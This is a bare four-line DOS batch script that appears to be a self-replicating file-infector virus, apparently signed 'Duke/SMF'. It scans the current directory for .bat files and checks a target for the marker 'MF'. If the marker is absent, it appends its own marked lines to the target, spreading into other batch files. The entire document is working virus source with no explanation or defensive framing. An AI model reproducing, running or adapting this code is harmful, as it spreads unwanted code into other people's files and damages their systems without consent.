@if "%0=="%Duke/SMF% exit
@for %%b in (*.bat) do set MF=%%b
@find "MF"<%MF%
@if errorlevel 1 find "MF"<%0>>%MF%
